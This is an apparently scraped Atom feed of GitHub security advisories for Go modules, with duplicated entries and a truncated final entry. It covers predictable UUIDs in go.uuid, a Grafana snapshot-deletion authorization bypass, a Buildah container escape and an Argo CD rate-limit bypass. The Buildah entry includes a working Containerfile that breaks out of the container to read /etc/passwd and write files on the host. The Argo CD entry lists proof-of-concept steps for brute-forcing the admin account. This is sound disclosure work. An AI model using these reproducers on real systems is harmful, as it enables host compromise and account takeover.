<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/go.rss</id>
    <title>Security Advisory for Go modules</title>
    <updated>2024-03-27T21:01:15.708Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago"/>
    <subtitle>Security Advisory for Go modules on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[github.com/apptainer/sif/v2] github.com/satori/go.uuid has Predictable SIF UUID Identifiers]]></title>
        <id>https://github.com/advisories/GHSA-33m6-q9v5-62r7</id>
        <link href="https://github.com/advisories/GHSA-33m6-q9v5-62r7"/>
        <updated>2024-03-27T18:17:41.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The siftool new command produces predictable UUID identifiers due to insecure randomness in the version of the <code>github.com/satori/go.uuid</code> module used as a dependency.</p>
<h3 id="patches">Patches</h3>
<p>A patch is available in version &gt;= v1.2.1-0.20180404165556-75cca531ea76 of the module. Users are encouraged to upgrade.</p>
<p>Fixed by <a href="https://github.com/hpcng/sif/pull/90">https://github.com/hpcng/sif/pull/90</a></p>
<h3 id="workarounds">Workarounds</h3>
<p>Users passing CreateInfo struct should ensure the ID field is generated using a version of github.com/satori/go.uuid that is not vulnerable to this issue. Unfortunately, the latest tagged release is vulnerable to this issue. One way to obtain a non-vulnerable version is:</p>
<p><code>go get -u github.com/satori/go.uuid@v1.2.1-0.20180404165556-75cca531ea76</code></p>
<h3 id="references">References</h3>
<p><a href="https://github.com/satori/go.uuid/issues/73">https://github.com/satori/go.uuid/issues/73</a></p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory:</p>
<p>Open an issue in <a href="https://github.com/hpcng/sif/issues">https://github.com/hpcng/sif/issues</a></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/hpcng/sif/security/advisories/GHSA-33m6-q9v5-62r7">https://github.com/hpcng/sif/security/advisories/GHSA-33m6-q9v5-62r7</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-3538">https://nvd.nist.gov/vuln/detail/CVE-2021-3538</a></li>
<li><a href="https://github.com/satori/go.uuid/issues/73">https://github.com/satori/go.uuid/issues/73</a></li>
<li><a href="https://github.com/satori/go.uuid/pull/75">https://github.com/satori/go.uuid/pull/75</a></li>
<li><a href="https://github.com/satori/go.uuid/commit/75cca531ea763666bc46e531da3b4c3b95f64557">https://github.com/satori/go.uuid/commit/75cca531ea763666bc46e531da3b4c3b95f64557</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=1954376">https://bugzilla.redhat.com/show_bug.cgi?id=1954376</a></li>
<li><a href="https://pkg.go.dev/vuln/GO-2022-0244">https://pkg.go.dev/vuln/GO-2022-0244</a></li>
<li><a href="https://snyk.io/vuln/SNYK-GOLANG-GITHUBCOMSATORIGOUUID-72488">https://snyk.io/vuln/SNYK-GOLANG-GITHUBCOMSATORIGOUUID-72488</a></li>
<li><a href="https://github.com/advisories/GHSA-33m6-q9v5-62r7">https://github.com/advisories/GHSA-33m6-q9v5-62r7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-33m6-q9v5-62r7</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2023-02-07T22:57:53.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/satori/go.uuid] github.com/satori/go.uuid has Predictable SIF UUID Identifiers]]></title>
        <id>https://github.com/advisories/GHSA-33m6-q9v5-62r7</id>
        <link href="https://github.com/advisories/GHSA-33m6-q9v5-62r7"/>
        <updated>2024-03-27T18:17:41.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The siftool new command produces predictable UUID identifiers due to insecure randomness in the version of the <code>github.com/satori/go.uuid</code> module used as a dependency.</p>
<h3 id="patches">Patches</h3>
<p>A patch is available in version &gt;= v1.2.1-0.20180404165556-75cca531ea76 of the module. Users are encouraged to upgrade.</p>
<p>Fixed by <a href="https://github.com/hpcng/sif/pull/90">https://github.com/hpcng/sif/pull/90</a></p>
<h3 id="workarounds">Workarounds</h3>
<p>Users passing CreateInfo struct should ensure the ID field is generated using a version of github.com/satori/go.uuid that is not vulnerable to this issue. Unfortunately, the latest tagged release is vulnerable to this issue. One way to obtain a non-vulnerable version is:</p>
<p><code>go get -u github.com/satori/go.uuid@v1.2.1-0.20180404165556-75cca531ea76</code></p>
<h3 id="references">References</h3>
<p><a href="https://github.com/satori/go.uuid/issues/73">https://github.com/satori/go.uuid/issues/73</a></p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory:</p>
<p>Open an issue in <a href="https://github.com/hpcng/sif/issues">https://github.com/hpcng/sif/issues</a></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/hpcng/sif/security/advisories/GHSA-33m6-q9v5-62r7">https://github.com/hpcng/sif/security/advisories/GHSA-33m6-q9v5-62r7</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-3538">https://nvd.nist.gov/vuln/detail/CVE-2021-3538</a></li>
<li><a href="https://github.com/satori/go.uuid/issues/73">https://github.com/satori/go.uuid/issues/73</a></li>
<li><a href="https://github.com/satori/go.uuid/pull/75">https://github.com/satori/go.uuid/pull/75</a></li>
<li><a href="https://github.com/satori/go.uuid/commit/75cca531ea763666bc46e531da3b4c3b95f64557">https://github.com/satori/go.uuid/commit/75cca531ea763666bc46e531da3b4c3b95f64557</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=1954376">https://bugzilla.redhat.com/show_bug.cgi?id=1954376</a></li>
<li><a href="https://pkg.go.dev/vuln/GO-2022-0244">https://pkg.go.dev/vuln/GO-2022-0244</a></li>
<li><a href="https://snyk.io/vuln/SNYK-GOLANG-GITHUBCOMSATORIGOUUID-72488">https://snyk.io/vuln/SNYK-GOLANG-GITHUBCOMSATORIGOUUID-72488</a></li>
<li><a href="https://github.com/advisories/GHSA-33m6-q9v5-62r7">https://github.com/advisories/GHSA-33m6-q9v5-62r7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-33m6-q9v5-62r7</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2023-02-07T22:57:53.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/containers/buildah] Container escape at build time]]></title>
        <id>https://github.com/advisories/GHSA-pmf3-c36m-g5cf</id>
        <link href="https://github.com/advisories/GHSA-pmf3-c36m-g5cf"/>
        <updated>2024-03-27T17:28:29.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p><em>What kind of vulnerability is it? Who is impacted?</em></p>
<p>Users running containers with root privileges allowing a container to run with read/write access to the host system files when selinux is not enabled.  With selinux enabled, some read access is allowed.</p>
<h3 id="patches">Patches</h3>
<p>From @nalind </p>
<pre><code># cat /root/cve-2024-1753.diff
--- internal/volumes/volumes.go
+++ internal/volumes/volumes.go
@@ -11,6 +11,7 @@ import (
 
     "errors"
 
+	"github.com/containers/buildah/copier"
     "github.com/containers/buildah/define"
     "github.com/containers/buildah/internal"
     internalParse "github.com/containers/buildah/internal/parse"
@@ -189,7 +190,11 @@ func GetBindMount(ctx *types.SystemContext, args []string, contextDir string, st
     // buildkit parity: support absolute path for sources from current build context
     if contextDir != "" {
         // path should be /contextDir/specified path
-		newMount.Source = filepath.Join(contextDir, filepath.Clean(string(filepath.Separator)+newMount.Source))
+		evaluated, err := copier.Eval(contextDir, newMount.Source, copier.EvalOptions{})
+		if err != nil {
+			return newMount, "", err
+		}
+		newMount.Source = evaluated
     } else {
         // looks like its coming from `build run --mount=type=bind` allow using absolute path
         // error out if no source is set
</code></pre>
<h3 id="reproducer">Reproducer</h3>
<p>Prior to testing, as root, add a memorable username to <code>/etc/passwd</code> via adduser or your favorite editor.   Also create a memorably named file in <code>/</code>.  Suggest: <code>touch /SHOULDNTSEETHIS.txt</code> and <code>adduser SHOULDNTSEETHIS</code>.  After testing, remember to remove both the file and the user from your system.</p>
<p>Use the following Containerfile</p>
<pre><code># cat ~/cve_Containerfile
FROM alpine as base

RUN ln -s / /rootdir
RUN ln -s /etc /etc2

FROM alpine

RUN echo "ls container root"
RUN ls -l /

RUN echo "With exploit show host root, not the container's root, and create /BIND_BREAKOUT in / on the host"
RUN --mount=type=bind,from=base,source=/rootdir,destination=/exploit,rw ls -l /exploit; touch /exploit/BIND_BREAKOUT; ls -l /exploit

RUN echo "With exploit show host /etc/passwd, not the container's, and create /BIND_BREAKOUT2 in /etc on the host"
RUN --mount=type=bind,rw,source=/etc2,destination=/etc2,from=base ls -l /; ls -l /etc2/passwd; cat /etc2/passwd; touch /etc2/BIND_BREAKOUT2; ls -l /etc2 
</code></pre>
<h4 id="to-test">To Test</h4>
<h5 id="testing-with-an-older-version-of-buildah-with-the-issue">Testing with an older version of Buildah with the issue</h5>
<pre><code>setenforce 0
buildah build -f ~/cve_Containerfile .
</code></pre>
<p>As part of the printout from the build, you should be able to see the contents of the <code>/' and </code>/etc<code>directories, including the</code>/SHOULDNOTSEETHIS.txt<code>file that you created, and the contents of the</code>/etc/passwd<code>file which will include the</code>SHOULDNOTSEETHIS<code>user that you created.  In addition, the file</code>/BIND_BREAKOUT<code>and</code>/etc/BIND_BREAKOUT2` will exist on the host after the command is completed.  Be sure to remove those two files between tests.  </p>
<pre><code>buildah rm -a
buildah rmi -a
rm /BIND_BREAKOUT
rm /etc/BIND_BREAKOUT2
setenforce 1
buildah build -f ~/cve_Containerfile .
</code></pre>
<p>Neither the <code>/BIND_BREAKEOUT</code> or <code>/etc/BIND_BREAKOUT2</code> files should be created.  An error should be raised during the build when both files are trying to be created.  Also, errors will be raised when the build tries to display the contents of the <code>/etc/passwd</code> file, and nothing will be displayed from that file.  </p>
<p>However, the files in both the <code>/</code> and <code>/etc</code> directories on the host system will be displayed.</p>
<h5 id="testing-with-the-patch">Testing with the patch</h5>
<p>Use the same commands as testing with an older version of Buildah.</p>
<p>When running using the patched version of Buildah, regardless of the <code>setenforce</code> settings,  you should not see the file that you created or the user that you added.  Also the <code>/BIND_BREAKOUT</code> and the <code>/etc/BIND_BREAKOUT</code> will not exist on the host after the test completes.</p>
<p>NOTE: With the fix, the contents of the <code>/</code> and <code>/etc</code> directories, and the <code>/etc/passwd</code> file will be displayed, however, it will be the file and contents from the container image, and NOT the host system.  Also the <code>/BIND_BREAKOUT</code> and <code>/etc/BIND_BREAKOUT</code> files will be created in the container image.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Ensure selinux controls are in place to avoid compromising sensitive system files and systems.  With "setenforce 0" set, which is not at all advised, the root file system is open for modification with this exploit.  With "setenfoce 1" set, which is the recommendation, files can not be changed.  However, the contents of the <code>/</code> directory can be displayed.  I.e., <code>ls -alF /</code> will show the contents of the host directory.</p>
<h3 id="references">References</h3>
<p>Unknown.</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/containers/buildah/security/advisories/GHSA-pmf3-c36m-g5cf">https://github.com/containers/buildah/security/advisories/GHSA-pmf3-c36m-g5cf</a></li>
<li><a href="https://github.com/containers/buildah/commit/9de9c20ff368beb84b84fe660773d352519dc1c5">https://github.com/containers/buildah/commit/9de9c20ff368beb84b84fe660773d352519dc1c5</a></li>
<li><a href="https://github.com/containers/buildah/commit/3deda19137f5dec0285bbb832bd93c22d860b087">https://github.com/containers/buildah/commit/3deda19137f5dec0285bbb832bd93c22d860b087</a></li>
<li><a href="https://github.com/containers/buildah/commit/a030f7b8cd373075affef1f86de43a87e502f3d8">https://github.com/containers/buildah/commit/a030f7b8cd373075affef1f86de43a87e502f3d8</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2265513">https://bugzilla.redhat.com/show_bug.cgi?id=2265513</a></li>
<li><a href="https://github.com/advisories/GHSA-pmf3-c36m-g5cf">https://github.com/advisories/GHSA-pmf3-c36m-g5cf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-pmf3-c36m-g5cf</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-03-19T20:06:52.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/grafana/grafana] Grafana vulnerable to authorization bypass]]></title>
        <id>https://github.com/advisories/GHSA-mh7p-8m2f-qrm6</id>
        <link href="https://github.com/advisories/GHSA-mh7p-8m2f-qrm6"/>
        <updated>2024-03-27T02:01:47.000Z</updated>
        <content type="html"><![CDATA[<p>It is possible for a user in a different organization from the owner of a snapshot to bypass authorization and delete a snapshot by issuing a <code>DELETE</code> request to <code>/api/snapshots/&lt;key&gt;</code> using its view key. This functionality is intended to only be available to individuals with the permission to write/edit to the snapshot in question, but due to a bug in the authorization logic, deletion requests issued by an unprivileged user in a different organization than the snapshot owner are treated as authorized.</p>
<p>Grafana Labs would like to thank Ravid Mazon and Jay Chen of Palo Alto Research for discovering and disclosing this vulnerability.</p>
<p>This issue affects Grafana: from 9.5.0 before 9.5.18, from 10.0.0 before 10.0.13, from 10.1.0 before 10.1.9, from 10.2.0 before 10.2.6, from 10.3.0 before 10.3.5.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-1313">https://nvd.nist.gov/vuln/detail/CVE-2024-1313</a></li>
<li><a href="https://grafana.com/security/security-advisories/cve-2024-1313">https://grafana.com/security/security-advisories/cve-2024-1313</a></li>
<li><a href="https://github.com/advisories/GHSA-mh7p-8m2f-qrm6">https://github.com/advisories/GHSA-mh7p-8m2f-qrm6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mh7p-8m2f-qrm6</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-03-26T18:32:07.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/grafana/grafana] Grafana vulnerable to authorization bypass]]></title>
        <id>https://github.com/advisories/GHSA-mh7p-8m2f-qrm6</id>
        <link href="https://github.com/advisories/GHSA-mh7p-8m2f-qrm6"/>
        <updated>2024-03-27T02:01:47.000Z</updated>
        <content type="html"><![CDATA[<p>It is possible for a user in a different organization from the owner of a snapshot to bypass authorization and delete a snapshot by issuing a <code>DELETE</code> request to <code>/api/snapshots/&lt;key&gt;</code> using its view key. This functionality is intended to only be available to individuals with the permission to write/edit to the snapshot in question, but due to a bug in the authorization logic, deletion requests issued by an unprivileged user in a different organization than the snapshot owner are treated as authorized.</p>
<p>Grafana Labs would like to thank Ravid Mazon and Jay Chen of Palo Alto Research for discovering and disclosing this vulnerability.</p>
<p>This issue affects Grafana: from 9.5.0 before 9.5.18, from 10.0.0 before 10.0.13, from 10.1.0 before 10.1.9, from 10.2.0 before 10.2.6, from 10.3.0 before 10.3.5.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-1313">https://nvd.nist.gov/vuln/detail/CVE-2024-1313</a></li>
<li><a href="https://grafana.com/security/security-advisories/cve-2024-1313">https://grafana.com/security/security-advisories/cve-2024-1313</a></li>
<li><a href="https://github.com/advisories/GHSA-mh7p-8m2f-qrm6">https://github.com/advisories/GHSA-mh7p-8m2f-qrm6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mh7p-8m2f-qrm6</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-03-26T18:32:07.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/grafana/grafana] Grafana vulnerable to authorization bypass]]></title>
        <id>https://github.com/advisories/GHSA-mh7p-8m2f-qrm6</id>
        <link href="https://github.com/advisories/GHSA-mh7p-8m2f-qrm6"/>
        <updated>2024-03-27T02:01:47.000Z</updated>
        <content type="html"><![CDATA[<p>It is possible for a user in a different organization from the owner of a snapshot to bypass authorization and delete a snapshot by issuing a <code>DELETE</code> request to <code>/api/snapshots/&lt;key&gt;</code> using its view key. This functionality is intended to only be available to individuals with the permission to write/edit to the snapshot in question, but due to a bug in the authorization logic, deletion requests issued by an unprivileged user in a different organization than the snapshot owner are treated as authorized.</p>
<p>Grafana Labs would like to thank Ravid Mazon and Jay Chen of Palo Alto Research for discovering and disclosing this vulnerability.</p>
<p>This issue affects Grafana: from 9.5.0 before 9.5.18, from 10.0.0 before 10.0.13, from 10.1.0 before 10.1.9, from 10.2.0 before 10.2.6, from 10.3.0 before 10.3.5.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-1313">https://nvd.nist.gov/vuln/detail/CVE-2024-1313</a></li>
<li><a href="https://grafana.com/security/security-advisories/cve-2024-1313">https://grafana.com/security/security-advisories/cve-2024-1313</a></li>
<li><a href="https://github.com/advisories/GHSA-mh7p-8m2f-qrm6">https://github.com/advisories/GHSA-mh7p-8m2f-qrm6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mh7p-8m2f-qrm6</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-03-26T18:32:07.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/grafana/grafana] Grafana vulnerable to authorization bypass]]></title>
        <id>https://github.com/advisories/GHSA-mh7p-8m2f-qrm6</id>
        <link href="https://github.com/advisories/GHSA-mh7p-8m2f-qrm6"/>
        <updated>2024-03-27T02:01:47.000Z</updated>
        <content type="html"><![CDATA[<p>It is possible for a user in a different organization from the owner of a snapshot to bypass authorization and delete a snapshot by issuing a <code>DELETE</code> request to <code>/api/snapshots/&lt;key&gt;</code> using its view key. This functionality is intended to only be available to individuals with the permission to write/edit to the snapshot in question, but due to a bug in the authorization logic, deletion requests issued by an unprivileged user in a different organization than the snapshot owner are treated as authorized.</p>
<p>Grafana Labs would like to thank Ravid Mazon and Jay Chen of Palo Alto Research for discovering and disclosing this vulnerability.</p>
<p>This issue affects Grafana: from 9.5.0 before 9.5.18, from 10.0.0 before 10.0.13, from 10.1.0 before 10.1.9, from 10.2.0 before 10.2.6, from 10.3.0 before 10.3.5.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-1313">https://nvd.nist.gov/vuln/detail/CVE-2024-1313</a></li>
<li><a href="https://grafana.com/security/security-advisories/cve-2024-1313">https://grafana.com/security/security-advisories/cve-2024-1313</a></li>
<li><a href="https://github.com/advisories/GHSA-mh7p-8m2f-qrm6">https://github.com/advisories/GHSA-mh7p-8m2f-qrm6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mh7p-8m2f-qrm6</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-03-26T18:32:07.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/grafana/grafana] Grafana vulnerable to authorization bypass]]></title>
        <id>https://github.com/advisories/GHSA-mh7p-8m2f-qrm6</id>
        <link href="https://github.com/advisories/GHSA-mh7p-8m2f-qrm6"/>
        <updated>2024-03-27T02:01:47.000Z</updated>
        <content type="html"><![CDATA[<p>It is possible for a user in a different organization from the owner of a snapshot to bypass authorization and delete a snapshot by issuing a <code>DELETE</code> request to <code>/api/snapshots/&lt;key&gt;</code> using its view key. This functionality is intended to only be available to individuals with the permission to write/edit to the snapshot in question, but due to a bug in the authorization logic, deletion requests issued by an unprivileged user in a different organization than the snapshot owner are treated as authorized.</p>
<p>Grafana Labs would like to thank Ravid Mazon and Jay Chen of Palo Alto Research for discovering and disclosing this vulnerability.</p>
<p>This issue affects Grafana: from 9.5.0 before 9.5.18, from 10.0.0 before 10.0.13, from 10.1.0 before 10.1.9, from 10.2.0 before 10.2.6, from 10.3.0 before 10.3.5.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-1313">https://nvd.nist.gov/vuln/detail/CVE-2024-1313</a></li>
<li><a href="https://grafana.com/security/security-advisories/cve-2024-1313">https://grafana.com/security/security-advisories/cve-2024-1313</a></li>
<li><a href="https://github.com/advisories/GHSA-mh7p-8m2f-qrm6">https://github.com/advisories/GHSA-mh7p-8m2f-qrm6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mh7p-8m2f-qrm6</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-03-26T18:32:07.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/argoproj/argo-cd/v2] Bypassing Rate Limit and Brute Force Protection Using Cache Overflow]]></title>
        <id>https://github.com/advisories/GHSA-2vgg-9h6w-m454</id>
        <link href="https://github.com/advisories/GHSA-2vgg-9h6w-m454"/>
        <updated>2024-03-22T20:05:15.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>An attacker can effectively bypass the rate limit and brute force protections by exploiting the application's weak cache-based mechanism. This loophole in security can be combined with other vulnerabilities to attack the default admin account. This flaw undermines a previously <a href="https://argo-cd.readthedocs.io/en/stable/security_considerations/#cve-2020-8827-insufficient-anti-automationanti-brute-force">patched CVE</a> intended to protect against brute-force attacks.</p>
<h3 id="details">Details</h3>
<p>The application's brute force protection relies on a cache mechanism that tracks login attempts for each user. This cache is limited to a <code>defaultMaxCacheSize</code> of 1000 entries. An attacker can overflow this cache by bombarding it with login attempts for different users, thereby pushing out the admin account's failed attempts and effectively resetting the rate limit for that account.</p>
<p>The brute force protection mechanism's code:</p>
<pre><code class="language-go">   if failed &amp;&amp; len(failures) &gt;= getMaximumCacheSize() {
       log.Warnf("Session cache size exceeds %d entries, removing random entry",

getMaximumCacheSize())
       idx := rand.Intn(len(failures) - 1)
       var rmUser string
       i := 0
       for key := range failures {

           if i == idx {
               rmUser = key

               delete(failures, key)

break

}

i++ }

       log.Infof("Deleted entry for user %s from cache", rmUser)
   }
</code></pre>
<h3 id="poc">PoC</h3>
<ol>
<li>Set up the application environment and identify the login page.</li>
<li>Execute 4 failed login attempts for the admin account.</li>
<li>Run a Burp Intruder attack to populate the cache with login attempts for usernames ranging from 1 to 10000.</li>
<li>After 1000 attempts, start monitoring to see if the admin entries in the cache have been cleared.</li>
<li>At this point, brute-force the admin account.</li>
</ol>
<p>In just 15 minutes, the PoC was able to perform 230 brute force attempts on the admin account. This rate allows for approximately 1000 requests per hour, effectively rendering the <a href="https://argo-cd.readthedocs.io/en/stable/security_considerations/#cve-2020-8827-insufficient-anti-automationanti-brute-force">older CVE</a> rate limit patches useless.</p>
<h3 id="impact">Impact</h3>
<p>This is a severe vulnerability that enables attackers to perform brute force attacks at an accelerated rate, especially targeting the default admin account.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/argoproj/argo-cd/security/advisories/GHSA-2vgg-9h6w-m454">https://github.com/argoproj/argo-cd/security/advisories/GHSA-2vgg-9h6w-m454</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-21662">https://nvd.nist.gov/vuln/detail/CVE-2024-21662</a></li>
<li><a href="https://github.com/argoproj/argo-cd/commit/17b0df1168a4c535f6f37e95f25ed7cd81e1fa4d">https://github.com/argoproj/argo-cd/commit/17b0df1168a4c535f6f37e95f25ed7cd81e1fa4d</a></li>
<li><a href="https://github.com/argoproj/argo-cd/commit/6e181d72b31522f886a2afa029d5b26d7912ec7b">https://github.com/argoproj/argo-cd/commit/6e181d72b31522f886a2afa029d5b26d7912ec7b</a></li>
<li><a href="https://github.com/argoproj/argo-cd/commit/cebb6538f7944c87ca2fecb5d17f8baacc431456">https://github.com/argoproj/argo-cd/commit/cebb6538f7944c87ca2fecb5d17f8baacc431456</a></li>
<li><a href="https://argo-cd.readthedocs.io/en/stable/security_considerations/#cve-2020-8827-insufficient-anti-automationanti-brute-force">https://argo-cd.readthedocs.io/en/stable/security_considerations/#cve-2020-8827-insufficient-anti-automationanti-brute-force</a></li>
<li><a href="https://github.com/advisories/GHSA-2vgg-9h6w-m454">https://github.com/advisories/GHSA-2vgg-9h6w-m454</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2vgg-9h6w-m454</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-03-18T20:29:05.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/argoproj/argo-cd/v2] Bypassing Rate Limit and Brute Force Protection Using Cache Overflow]]></title>
        <id>https://github.com/advisories/GHSA-2vgg-9h6w-m454</id>
        <link href="https://github.com/advisories/GHSA-2vgg-9h6w-m454"/>
        <updated>2024-03-22T20:05:15.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>An attacker can effectively bypass the rate limit and brute force protections by exploiting the application's weak cache-based mechanism. This loophole in security can be combined with other vulnerabilities to attack the default admin account. This flaw undermines a previously <a href="https://argo-cd.readthedocs.io/en/stable/security_considerations/#cve-2020-8827-insufficient-anti-automationanti-brute-force">patched CVE</a> intended to protect against brute-force attacks.</p>
<h3 id="details">Details</h3>
<p>The application's brute force protection relies on a cache mechanism that tracks login attempts for each user. This cache is limited to a <code>defaultMaxCacheSize</code> of 1000 entries. An attacker can overflow this cache by bombarding it with login attempts for different users, thereby pushing out the admin account's failed attempts and effectively resetting the rate limit for that account.</p>
<p>The brute force protection mechanism's code:</p>
<pre><code class="language-go">   if failed &amp;&amp; len(failures) &gt;= getMaximumCacheSize() {
       log.Warnf("Session cache size exceeds %d entries, removing random entry",

getMaximumCacheSize())
       idx := rand.Intn(len(failures) - 1)
       var rmUser string
       i := 0
       for key := range failures {

           if i == idx {
               rmUser = key

               delete(failures, key)

break

}

i++ }

       log.Infof("Deleted entry for user %s from cache", rmUser)
   }
</code></pre>
<h3 id="poc">PoC</h3>
<ol>
<li>Set up the application environment and identify the login page.</li>
<li>Execute 4 failed login attempts for the admin account.</li>
<li>Run a Burp Intruder attack to populate the cache with login attempts for usernames ranging from 1 to 10000.</li>
<li>After 1000 attempts, start monitoring to see if the admin entries in the cache have been cleared.</li>
<li>At this point, brute-force the admin account.</li>
</ol>
<p>In just 15 minutes, the PoC was able to perform 230 brute force attempts on the admin account. This rate allows for approximately 1000 requests per hour, effectively rendering the <a href="https://argo-cd.readthedocs.io/en/stable/security_considerations/#cve-2020-8827-insufficient-anti-automationanti-brute-force">older CVE</a> rate limit patches useless.</p>
<h3 id="impact">Impact</h3>
<p>This is a severe vulnerability that enables attackers to perform brute force attacks at an accelerated rate, especially targeting the default admin account.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/argoproj/argo-cd/security/advisories/GHSA-2vgg-9h6w-m454">https://github.com/argoproj/argo-cd/security/advisories/GHSA-2vgg-9h6w-m454</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-21662">https://nvd.nist.gov/vuln/detail/CVE-2024-21662</a></li>
<li><a href="https://github.com/argoproj/argo-cd/commit/17b0df1168a4c535f6f37e95f25ed7cd81e1fa4d">https://github.com/argoproj/argo-cd/commit/17b0df1168a4c535f6f37e95f25ed7cd81e1fa4d</a></li>
<li><a href="https://github.com/argoproj/argo-cd/commit/6e181d72b31522f886a2afa029d5b26d7912ec7b">https://github.com/argoproj/argo-cd/commit/6e181d72b31522f886a2afa029d5b26d7912ec7b</a></li>
<li><a href="https://github.com/argoproj/argo-cd/commit/cebb6538f7944c87ca2fecb5d17f8baacc431456">https://github.com/argoproj/argo-cd/commit/cebb6538f7944c87ca2fecb5d17f8baacc431456</a></li>
<li><a href="https://argo-cd.readthedocs.io/en/stable/security_considerations/#cve-2020-8827-insufficient-anti-automationanti-brute-force">https://argo-cd.readthedocs.io/en/stable/security_considerations/#cve-2020-8827-insufficient-anti-automationanti-brute-force</a></li>
<li><a href="https://github.com/advisories/GHSA-2vgg-9h6w-m454">https://github.com/advisories/GHSA-2vgg-9h6w-m454</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2vgg-9h6w-m454</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-03-18T20:29:05.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/argoproj/argo-cd/v2] Bypassing Rate Limit and Brute Force Protection Using Cache Overflow]]></title>
        <id>https://github.com/advisories/GHSA-2vgg-9h6w-m454</id>
        <link href="https://github.com/advisories/GHSA-2vgg-9h6w-m454"/>
        <updated>2024-03-22T20:05:15.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>An attacker can effectively bypass the rate limit and brute force protections by exploiting the application's weak cache-based mechanism. This loophole in security can be combined with other vulnerabilities to attack the default admin account. This flaw undermines a previously <a href="https://argo-cd.readthedocs.io/en/stable/security_considerations/#cve-2020-8827-insufficient-anti-automationanti-brute-force">patched CVE</a> intended to protect against brute-force attacks.</p>
<h3 id="details">Details</h3>
